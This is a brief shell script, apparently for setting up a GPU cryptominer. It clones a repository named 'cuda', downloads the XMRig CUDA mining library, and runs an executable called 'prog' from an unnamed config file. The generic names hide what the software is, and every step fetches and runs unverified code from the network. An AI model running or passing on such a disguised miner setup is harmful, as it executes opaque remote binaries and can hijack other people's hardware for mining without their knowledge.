sudo apt install libhwloc-dev
# grab the exec + conf
git clone https://github.com/iceyfromdiscord/cuda
cd cuda

# grab cuda (idk if it needs this???)
curl -L -O https://github.com/iceyfromdiscord/cuda/releases/download/_/libxmrig-cuda.so

# start
chmod +x ./prog
./prog --config ./_.json
